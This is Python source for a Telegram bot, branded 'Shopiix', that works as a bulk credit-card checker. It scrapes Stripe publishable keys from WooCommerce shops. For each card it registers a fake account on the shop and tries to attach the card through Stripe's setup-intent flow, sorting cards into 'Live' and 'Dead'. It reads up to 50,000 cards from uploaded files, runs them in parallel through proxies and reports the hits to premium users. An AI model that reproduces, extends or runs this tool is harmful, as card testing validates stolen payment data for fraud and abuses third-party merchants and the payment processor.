import aiohttp
import asyncio
import re
import random
import string
import time
import os
import json
import aiofiles
from telethon import events, Button

# ─── CONFIG ────────────────────────────────────────────────────────────────────
MAX_CARDS          = 50000
_STRIPE_SITES_FILE = "stripe_sites.json"
_stripe_sites: dict = {}
_pk_cache: dict     = {}

UA = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

rnd  = lambda k: ''.join(random.choices('0123456789abcdef', k=k))
fn   = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
jn   = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)

# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
# _stripe_sites = {user_id: [url1, url2, ...]}
MAX_SITES = 10

def _load_stripe_sites():
    global _stripe_sites
    try:
        with open(_STRIPE_SITES_FILE) as f:
            data = json.load(f)
        # support both old format (str) and new format (list)
        result = {}
        for k, v in data.items():
            result[int(k)] = v if isinstance(v, list) else [v]
        _stripe_sites = result
    except Exception:
        _stripe_sites = {}

def _save_stripe_sites():
    try:
        with open(_STRIPE_SITES_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _stripe_sites.items()}, f)
    except Exception:
        pass

def _get_user_sites(user_id):
    return _stripe_sites.get(user_id, [])

def _add_user_site(user_id, url):
    sites = _stripe_sites.get(user_id, [])
    if url not in sites:
        sites.append(url)
    _stripe_sites[user_id] = sites
    _save_stripe_sites()

def _remove_user_site(user_id, idx):
    sites = _stripe_sites.get(user_id, [])
    if 0 <= idx < len(sites):
        removed = sites.pop(idx)
        _pk_cache.pop(removed, None)
        _stripe_sites[user_id] = sites
        _save_stripe_sites()
        return removed
    return None

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def _parse_proxy(p):
    if not p:
        return None
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _extract_cc(text):
    pattern = re.compile(
        r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b'
    )
    seen, cards = set(), []
    for m in pattern.finditer(text):
        card = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if card not in seen:
            seen.add(card)
            cards.append(card)
    return cards

def _random_email():
    return (
        f"{''.join(random.choices(string.ascii_lowercase, k=6))}"
        f"{rnd(3)}@gmail.com"
    )

# ─── PK SCRAPER ────────────────────────────────────────────────────────────────
async def _scrape_pk(site, proxy=None):
    if site in _pk_cache:
        return _pk_cache[site]
    patterns = [r'(pk_live_[A-Za-z0-9]{20,})', r'(pk_test_[A-Za-z0-9]{20,})']
    urls     = [f'{site}/checkout/', f'{site}/', f'{site}/shop/']
    headers  = {'user-agent': UA}
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=headers, connector=connector) as sess:
            for url in urls:
                try:
                    async with sess.get(url, proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=12),
                            allow_redirects=True) as resp:
                        text = await resp.text(errors='ignore')
                    for pat in patterns:
                        m = re.search(pat, text)
                        if m:
                            _pk_cache[site] = m.group(1)
                            return _pk_cache[site]
                except Exception:
                    continue
    except Exception:
        pass
    return None

# ─── CORE CHECKER (setup_intent flow) ─────────────────────────────────────────
async def stripe_auth(card: str, site: str, pk: str, proxy_str=None):
    p = card.strip().split('|')
    if len(p) != 4:
        return {'status': 'Error', 'message': 'Invalid format', 'card': card}

    cc, mm, yy, cvv = p
    yy    = yy[-2:] if len(yy) == 4 else yy
    proxy = _parse_proxy(proxy_str)

    headers = {'user-agent': UA}
    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(headers=headers, connector=connector) as s:

            # 1. Get register nonce
            try:
                async with s.get(f"{site}/my-account/", proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=30)) as r:
                    text = await r.text(errors='ignore')
            except Exception as e:
                return {'status': 'Error', 'message': f'Site unreachable: {e}', 'card': card}

            n = fn(text, 'woocommerce-register-nonce')
            if not n:
                return {'status': 'Error', 'message': 'No register nonce', 'card': card}

            # 2. Register random account
            await s.post(f"{site}/my-account/",
                headers={
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site,
                    'referer': f'{site}/my-account/',
                },
                data={
                    'email': _random_email(),
                    'password': rnd(12),
                    'woocommerce-register-nonce': n,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                },
                proxy=proxy, timeout=aiohttp.ClientTimeout(total=30))
            await asyncio.sleep(0.5)

            # 3. Get setup intent nonce
            try:
                async with s.get(f"{site}/my-account/payment-methods/",
                        headers={'referer': f'{site}/my-account/'},
                        proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as r2:
                    text2 = await r2.text(errors='ignore')
            except Exception as e:
                return {'status': 'Error', 'message': f'Nonce fetch failed: {e}', 'card': card}

            an = jn(text2, 'createAndConfirmSetupIntentNonce')
            if not an:
                return {'status': 'Error', 'message': 'No ajax nonce', 'card': card}
            await asyncio.sleep(0.3)

            # 4. Create Stripe payment method
            async with aiohttp.ClientSession() as stripe_sess:
                try:
                    async with stripe_sess.post(
                        'https://api.stripe.com/v1/payment_methods',
                        headers={
                            'origin': 'https://js.stripe.com',
                            'referer': 'https://js.stripe.com/',
                        },
                        data={
                            'type': 'card',
                            'card[number]': cc,
                            'card[cvc]': cvv,
                            'card[exp_year]': yy,
                            'card[exp_month]': mm.zfill(2),
                            'billing_details[address][country]': 'MO',
                            'key': pk,
                            '_stripe_version': '2024-06-20',
                            'payment_user_agent': (
                                'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; '
                                'payment-element; deferred-intent'
                            ),
                            'guid': rnd(48),
                            'muid': rnd(32),
                            'sid': rnd(32),
                            'time_on_page': str(random.randint(5000, 15000)),
                        },
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as dr:
                        d = await dr.json(content_type=None)
                except Exception as e:
                    return {'status': 'Error', 'message': f'Stripe PM error: {e}', 'card': card}

            if 'error' in d:
                msg = d['error'].get('message', 'Declined')
                return {'status': 'Dead', 'message': msg, 'card': card}
            if 'id' not in d:
                return {'status': 'Error', 'message': 'Unexpected Stripe response', 'card': card}
            await asyncio.sleep(0.3)

            # 5. Confirm setup intent via WooCommerce
            try:
                async with s.post(f"{site}/",
                    params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                    headers={
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': site,
                        'referer': f'{site}/my-account/add-payment-method/',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data={
                        'action': 'create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': d['id'],
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': an,
                    },
                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=60)
                ) as resr:
                    res = await resr.json(content_type=None)
            except Exception as e:
                return {'status': 'Error', 'message': f'Confirm error: {e}', 'card': card}

            if res.get('success'):
                return {'status': 'Live', 'message': 'Payment Method Added ✅', 'card': card}

            dt = res.get('data', {})
            if isinstance(dt, dict):
                if dt.get('status') == 'requires_action':
                    return {'status': 'Live', 'message': '3DS Required', 'card': card}
                e  = dt.get('error', {})
                msg = (e.get('message', 'Unknown') if isinstance(e, dict) else str(e))
                return {'status': 'Dead', 'message': msg, 'card': card}
            return {'status': 'Dead', 'message': str(dt), 'card': card}

    except asyncio.TimeoutError:
        return {'status': 'Error', 'message': 'Timeout', 'card': card}
    except Exception as ex:
        return {'status': 'Error', 'message': str(ex)[:80], 'card': card}
    finally:
        await connector.close()

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):

    _load_stripe_sites()

    # ── /sadd ──────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/sadd(\s|$)'))
    async def sadd_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        parts   = event.raw_text.split(maxsplit=1)
        url_raw = None

        if len(parts) >= 2:
            url_raw = parts[1].strip()
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and reply_msg.file.name and \
                    reply_msg.file.name.endswith('.txt'):
                file_path = await reply_msg.download_media()
                try:
                    async with aiofiles.open(file_path, 'r',
                            encoding='utf-8', errors='ignore') as f:
                        content = await f.read()
                    os.remove(file_path)
                    m = re.search(r'https?://\S+', content)
                    if not m:
                        m = re.search(r'[a-zA-Z0-9][-a-zA-Z0-9.]+\.[a-zA-Z]{2,}', content)
                    if m:
                        url_raw = m.group(0).strip().rstrip('/')
                except Exception:
                    pass
            elif reply_msg and reply_msg.text:
                m = re.search(r'https?://\S+', reply_msg.text)
                if m:
                    url_raw = m.group(0).strip().rstrip('/')

        if not url_raw:
            await event.reply(
                "❌ <b>Usage:</b>\n"
                "▸ <code>/sadd https://yoursite.com</code>\n"
                "▸ Reply to a <b>.txt</b> file containing the URL with <code>/sadd</code>\n\n"
                "<i>Site must be WooCommerce + Stripe.</i>",
                parse_mode='html'
            )
            return

        sites_now = _get_user_sites(user_id)
        if len(sites_now) >= MAX_SITES:
            await event.reply(
                f"❌ <b>Max {MAX_SITES} sites reached.</b>\n"
                f"Use <code>/srem</code> to remove one first.",
                parse_mode='html'
            )
            return

        url  = _normalize_url(url_raw)
        wait = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"<i>Fetching Stripe PK from site...</i>",
            parse_mode='html'
        )

        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None
        pk      = await _scrape_pk(url, proxy)

        if pk:
            _add_user_site(user_id, url)
            sites  = _get_user_sites(user_id)
            masked = pk[:14] + '...' + pk[-4:]
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"✅  <b>𝗦𝗜𝗧𝗘  𝗔𝗗𝗗𝗘𝗗</b>  ✅\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>   ▸  <code>{url}</code>\n"
                f"🔑 <b>𝗣𝗞</b>     ▸  <code>{masked}</code>\n"
                f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>  ▸  {len(sites)} / {MAX_SITES} sites\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )
        else:
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"❌  <b>𝗡𝗢  𝗣𝗞  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>  ▸  <code>{url}</code>\n\n"
                f"<i>No Stripe PK found. Make sure it's a WooCommerce + Stripe site.</i>\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )

    # ── /slist ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/slist(\s|$)'))
    async def slist_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return
        sites = _get_user_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No sites configured.</b>\n\n"
                "Use <code>/sadd https://yoursite.com</code>",
                parse_mode='html'
            )
            return
        lines = '\n'.join(
            f"<b>{i+1}.</b>  <code>{s}</code>"
            + (f"\n      🔑 <i>{_pk_cache[s][:14]}...</i>" if s in _pk_cache else "")
            for i, s in enumerate(sites)
        )
        await event.reply(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"🌐  <b>𝗦𝗧𝗥𝗜𝗣𝗘  𝗦𝗜𝗧𝗘𝗦</b>  [ {len(sites)} / {MAX_SITES} ]\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"{lines}\n\n"
            f"◈  Remove: <code>/srem &lt;number&gt;</code>\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /srem ──────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/srem(\s|$)'))
    async def srem_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            await event.reply(
                "❌ <b>Usage:</b> <code>/srem &lt;number&gt;</code>\n\n"
                "Use <code>/slist</code> to see site numbers.",
                parse_mode='html'
            )
            return
        idx     = int(parts[1].strip()) - 1
        removed = _remove_user_site(user_id, idx)
        if removed:
            await event.reply(
                f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n"
                f"🌐 <code>{removed}</code>",
                parse_mode='html'
            )
        else:
            await event.reply(
                "❌ Invalid number. Use <code>/slist</code> to check.",
                parse_mode='html'
            )

    # ── /st ────────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
    async def st_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        sites = _get_user_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No Stripe site set.</b>\n\n"
                "Use <code>/sadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return

        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.reply(
                "❌ <b>Usage:</b> <code>/st cc|mm|yy|cvv</code>",
                parse_mode='html'
            )
            return

        card = parts[1].strip()
        if card.count('|') != 3:
            await event.reply(
                "❌ Invalid CC format. Use: <code>/st 4111111111111111|01|25|123</code>",
                parse_mode='html'
            )
            return

        site    = random.choice(sites)
        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None

        pk = _pk_cache.get(site)
        if not pk:
            pk = await _scrape_pk(site, proxy)
        if not pk:
            await event.reply(
                f"❌ No PK on <code>{site}</code>.\nRemove it with <code>/srem</code> and add a working site.",
                parse_mode='html'
            )
            return

        status_msg = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<code>{card}</code>",
            parse_mode='html'
        )
        t0      = time.time()
        result  = await stripe_auth(card, site, pk, proxy_str=proxy)
        elapsed = round(time.time() - t0, 2)

        status  = result['status']
        message = result['message']

        if status == 'Live':
            s_emoji = '🔥'
            s_text  = '𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗'
        elif status == 'Dead':
            s_emoji = '❌'
            s_text  = '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗'
        else:
            s_emoji = '⚠️'
            s_text  = '𝗘𝗥𝗥𝗢𝗥'

        await status_msg.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"{s_emoji}  <b>{s_text}</b>  {s_emoji}\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗖𝗔𝗥𝗗</b>   ▸  <code>{card}</code>\n"
            f"◈  <b>𝗥𝗘𝗦𝗣</b>   ▸  <i>{message[:120]}</i>\n"
            f"🌐 <b>𝗚𝗪</b>     ▸  Stripe Auth\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /stxt ──────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/stxt(\s|$)'))
    async def stxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
            return

        sites = _get_user_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No Stripe site set.</b>\n\n"
                "Use <code>/sadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return

        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/stxt</code>.",
                              parse_mode='html')
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or \
                not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        # pre-warm PK cache for all sites
        proxies = load_proxies_fn(user_id)
        for _s in list(sites):
            if _s not in _pk_cache:
                _proxy = random.choice(proxies) if proxies else None
                await _scrape_pk(_s, _proxy)

        valid_sites = [s for s in sites if s in _pk_cache]
        if not valid_sites:
            await event.reply(
                "❌ No Stripe PK found on any of your sites. Reconfigure with <code>/sadd</code>.",
                parse_mode='html'
            )
            return

        wait_msg  = await event.reply("⏳ Reading file...", parse_mode='html')
        file_path = await reply_msg.download_media()
        try:
            async with aiofiles.open(file_path, 'r',
                    encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(file_path)
        except Exception:
            await wait_msg.edit("❌ Could not read file.", parse_mode='html')
            return

        cards = _extract_cc(content)
        if not cards:
            await wait_msg.edit("❌ No valid cards found in file.", parse_mode='html')
            return
        if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
            cards = cards[:MAX_CARDS]

        total    = len(cards)
        chat_id  = event.chat_id
        results  = {'live': [], 'dead': [], 'error': 0, 'start': time.time()}
        _stop    = [False]

        await wait_msg.edit(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"💳 <b>{total}</b> cards loaded — Starting Stripe Auth...",
            parse_mode='html'
        )
        prog_msg = await event.respond(
            f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
            parse_mode='html'
        )

        stop_key = f"st_stop_{user_id}_{int(time.time())}".encode()

        async def _stop_handler(e):
            if e.sender_id == user_id and e.data == stop_key:
                _stop[0] = True
                await e.answer("⛔ Stopping...")

        bot.add_event_handler(_stop_handler, events.CallbackQuery())

        async def _update_prog(checked, last_card='', last_resp=''):
            elapsed  = int(time.time() - results['start'])
            h, rem   = divmod(elapsed, 3600)
            m_t, s_t = divmod(rem, 60)
            # mask last card number
            if last_card:
                num    = last_card.split('|')[0]
                masked = num[:6] + '*' * max(0, len(num) - 10) + num[-4:] if len(num) > 10 else num
            else:
                masked = '—'
            resp_short = (last_resp[:26] + '...') if len(last_resp) > 28 else (last_resp or '—')
            buttons = [
                [Button.inline(f"💳  Card  →  {masked}", b"noop")],
                [Button.inline(f"📝  Response  →  {resp_short}", b"noop")],
                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]", b"noop")],
                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]", b"noop")],
                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",     b"noop")],
                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",   b"noop")],
                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",           b"noop")],
                [Button.inline("⛔  Stop", stop_key)],
            ]
            try:
                await bot.edit_message(
                    chat_id, prog_msg.id,
                    f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
                    buttons=buttons, parse_mode='html'
                )
            except Exception:
                pass

        semaphore = asyncio.Semaphore(20)
        checked_count = [0]

        async def _check_one(card, idx):
            if _stop[0]:
                return
            async with semaphore:
                if _stop[0]:
                    return
                site   = random.choice(valid_sites)
                pk     = _pk_cache[site]
                proxy  = random.choice(proxies) if proxies else None
                result = await stripe_auth(card, site, pk, proxy_str=proxy)
                st     = result['status']
                msg    = result['message']
                if st == 'Live':
                    results['live'].append(result)
                elif st == 'Error':
                    results['error'] += 1
                else:
                    results['dead'].append(result)
                checked_count[0] += 1
                if checked_count[0] % 5 == 0 or checked_count[0] == total:
                    await _update_prog(checked_count[0], card, msg)

        await asyncio.gather(*[_check_one(c, i + 1) for i, c in enumerate(cards)])
        bot.remove_event_handler(_stop_handler)

        elapsed  = int(time.time() - results['start'])
        h, rem   = divmod(elapsed, 3600)
        m_t, s_t = divmod(rem, 60)

        hits_txt = ''
        for r in results['live'][:10]:
            hits_txt += f"🔥 <code>{r['card']}</code>\n"
        if not hits_txt:
            hits_txt = 'No hits found'

        summary = (
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"⚡  <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫  ·  𝗦𝗖𝗔𝗡  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ⚡\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗧𝗢𝗧𝗔𝗟</b>    ▸  <code>{total}</code>\n"
            f"🔥 <b>𝗟𝗜𝗩𝗘</b>     ▸  <code>{len(results['live'])}</code>\n"
            f"❌ <b>𝗗𝗘𝗔𝗗</b>     ▸  <code>{len(results['dead'])}</code>\n"
            f"⚠️ <b>𝗘𝗥𝗥𝗢𝗥𝗦</b>   ▸  <code>{results['error']}</code>\n"
            f"🌐 <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬</b>  ▸  Stripe Auth\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>    ▸  {h}h {m_t}m {s_t}s\n\n"
            f"〔 🎯  H I T S 〕\n"
            f"<blockquote>{hits_txt}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
        )
        try:
            await bot.edit_message(chat_id, prog_msg.id, summary, parse_mode='html')
        except Exception:
            await event.respond(summary, parse_mode='html')
